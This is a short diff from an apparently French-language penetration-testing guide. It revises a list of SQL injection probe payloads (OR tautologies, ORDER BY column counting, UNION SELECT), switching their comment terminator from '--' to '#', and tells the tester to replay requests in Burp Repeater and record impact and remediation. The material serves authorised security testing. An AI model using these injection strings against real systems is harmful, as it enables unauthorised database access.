@@ -11,10 +11,10 @@ Tester :
 '
 1' OR '1'='1
 1' OR '1'='2
-1' ORDER BY 1--
-1' ORDER BY 2--
-1' ORDER BY 3--
-1' UNION SELECT 1,2--
+1' ORDER BY 1#
+1' ORDER BY 2#
+1' ORDER BY 3#
+1' UNION SELECT 1,2#
 ```
 
 Envoyer la requête dans Burp Repeater et documenter : point d’entrée, paramètre, payload, réponse, impact, remédiation.
